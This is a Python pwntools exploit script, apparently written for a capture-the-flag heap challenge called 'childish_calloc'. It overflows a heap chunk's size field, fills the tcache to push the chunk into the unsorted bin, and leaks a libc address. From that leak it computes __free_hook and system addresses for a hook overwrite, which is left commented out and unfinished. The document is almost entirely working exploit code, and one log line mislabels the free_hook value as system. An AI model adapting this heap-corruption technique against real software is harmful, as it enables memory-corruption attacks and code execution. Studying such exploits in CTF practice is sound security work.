#!/usr/bin/python3
from pwn import *
# context.update(arch='i386')
e = ELF('childish_calloc')
def start():
    if args.GDB:
        context.terminal = ['tmux', 'splitw', "-h"]
        return gdb.debug(e.path)
    else:
        return remote('localhost', 4444)
# calloc ignores tcache
# index must be less than 14
def find_small_toy(p, index: int, size: int, details: bytes):
    '''
    size must be bigger than 32 and less than 56
    each allocation is 16 bytes starting with the size
    next is a pointer to "size" bytes
    and last is details entered - read takes in size+1
    '''
    p.send(b'1\n')
    p.sendline(bytes(str(index), 'utf-8'))
    p.sendline(bytes(str(size), 'utf-8'))
    p.send(details)
    p.clean()

def fix_small_toy(p, index: int, size: int, details: bytes, verify: int):
    '''
    frees the pointer at the index
    then allocates a new one and gets size bytes into area after the pointer
    the byte from the last allocation remains
    choosing 1 for verify gives the data
    '''
    p.send(b'2\n')
    p.clean()
    p.sendline(bytes(str(index), 'utf-8'))
    p.clean()
    p.sendline(bytes(str(size), 'utf-8'))
    p.clean()
    p.sendline(details)
    p.clean()
    p.sendline(bytes(str(verify), 'utf-8'))
    # get the data
    if verify:
        return p.clean()
    else:
        p.clean()
        return b''

def free(p, index: int):
    p.send(b'2\n')
    p.clean()
    p.sendline(bytes(str(index), 'utf-8'))
    p.clean()
    p.send(b'0\n')

def examine_small_toy(p, index: int):
    p.send(b'3\n')
    p.clean()
    p.sendline(bytes(str(index), 'utf-8'))
    return p.clean()

def find_big_toy(p, size: int):
    '''
    1456 between 62912
    '''
    p.send(b'4\n')
    p.clean()
    p.sendline(bytes(str(size), 'utf-8'))

if __name__=='__main__':
    io = start()
    find_small_toy(io, 0, 56, b'a'*19+b'\n')
    find_small_toy(io, 1, 56, b'b'*20+b'\n')
    find_small_toy(io, 12, 56, b'c'*20+b'\n')
    find_small_toy(io, 13, 56, b'd'*20+b'\n')
    find_small_toy(io, 14, 40, b'd'*20+b'\n')
    # 0 | 1 | 12 | 13 | 14
    # 0 goes into fastbins since calloc ignores tcache
    free(io, 0)
    # the next allocation overwrites 0
    # the whole chunk is null bytes and the heap overflow
    # is used to overwrite the heap metadata to c0 (use c1 b/c prev_in_use bit)
    find_small_toy(io, 11, 56, p64(0)*7+b'\xc1'+b'\n')
    # 11 | 1 | 12 | 13 | 14
    # freeing chunk 11 removes a chunk of size 192 -> gets put into unsortedbin
    # to remove it from the tcache fill in its position 7 times
    # the 8th time the tcache is full so the chunk is freed into the unsortedbins
    for i in range(8):
        free(io, 1)
    io.clean()
    # when one is freed since its size is overwritten to 192 
    # 1 | 12 | 13 | 14 all get freed together into tcache 7 times then into unsortedbin(since tcache has no space)
    # the unsortedbin has a libc leak address which we can leak
    x = examine_small_toy(io, 1)
    heap_leak = u64(x[:6]+b'\x00'*(8-len(x[:6])))
    log.info("arena leak: " + hex(heap_leak))
    free_hook_gdb = 0x7f62bef288e8
    arena_gdb = 0x7f62bef26ca0
    system_gdb = 0x7f62beb8a440
    free_hook = heap_leak + free_hook_gdb - arena_gdb
    log.info("free_hook: "+hex(free_hook))
    system = heap_leak +  system_gdb - arena_gdb
    log.info("system: "+hex(free_hook))
    # ===========================================
    # free 0 again
    # free(io, 0)
    # write into area we just freed again and change its size to 41
    # find_small_toy(io, 10, 56, p64(0)*7+b'\x41'+b'\n')
    # free 1 (circular point in tcache)
    # free(io, 1)
    # free(io, 13)
    # free(io, 1)
    # # into index 0's location create 0x40 sized chunk
    # # mmap bit and prev-in-use bit set so 0x43
    # free(io, 0)
    # find_small_toy(io, 9, 56, b'\x43')
    # find_small_toy(io, 8, 56, b'\x90')
    io.interactive()
